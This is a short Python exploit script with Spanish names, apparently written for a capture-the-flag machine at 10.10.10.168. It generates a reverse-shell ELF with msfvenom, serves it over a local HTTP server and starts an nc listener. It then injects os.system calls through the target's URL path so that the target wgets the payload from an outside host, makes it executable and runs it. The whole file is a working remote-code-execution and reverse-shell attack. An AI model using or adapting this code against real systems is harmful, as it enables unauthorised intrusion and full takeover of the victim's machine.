from requests import get
import os,sys,threading

def servidor():
    os.system("python -m SimpleHTTPServer 80")
def escuchar():
    global LPORT
    os.system("nc -nvlp "+str(LPORT))

def main():
    
    global LPORT
    LHOST,LPORT = sys.argv[1] ,  sys.argv[2]
    os.system("msfvenom -p linux/x64/shell_reverse_tcp LHOST="+LHOST+" LPORT="+LPORT+" -f elf -o hola.elf")
    hilo1 = threading.Thread(target=servidor)
    hilo1.start()
    print("inicie hilo1")
    hilo2 = threading.Thread(target=escuchar)
    hilo2.start()
    #print("inicie hilo2")
    cmd = "wget http://10.10.16.50/hola.elf -O /tmp/hi.elf"
    get("http://10.10.10.168:8080/';path='/';os.system("+"'"+cmd+"'"+");"+"'")
    #os.system("rm hola.elf")
    cmd1 = "chmod +x /tmp/hi.elf"
    get("http://10.10.10.168:8080/';path='/';os.system("+"'"+cmd1+"'"+");"+"'")
    cmd2 = "/tmp/hi.elf"
    get("http://10.10.10.168:8080/';path='/';os.system("+"'"+cmd2+"'"+");"+"'")

    

if __name__ == '__main__':
    main()